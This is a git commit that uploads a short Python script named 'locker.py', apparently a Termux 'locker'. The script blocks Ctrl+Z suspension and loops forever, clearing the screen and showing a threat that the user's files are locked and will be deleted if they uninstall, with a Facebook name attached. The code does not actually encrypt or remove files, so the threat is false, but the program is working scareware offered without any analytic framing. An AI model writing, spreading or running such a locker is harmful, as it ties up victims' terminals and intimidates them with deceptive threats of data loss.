542733fd37448dafdcdbbd57124039264d7e8efb
duranmev <80565666+duranmev@users.noreply.github.com>
2021-03-13 13:50:43 +0800

    Add files via upload

---
+++ locker.py
@@ -0,0 +1,19 @@
+print (""" """)
+
+import os ,sys ,signal      
+signal.signal(signal.SIGTSTP, signal.SIG_IGN)
+      
+def logo():
+  print ("")
+  print ("")
+  print ("")
+  print("  YOUR FILES AND TERMUX IS LOCK ,DONT TRY TO UNINSTALL THIS APPLICATION OR ALL YOUR FILES BE FULL REMOVED !! >> Facebook :Honey Gainer")
+
+while 1:
+  while 1:
+      while 1:
+        while 1:
+          while 1:
+            os.system("clear")
+            logo()
+          
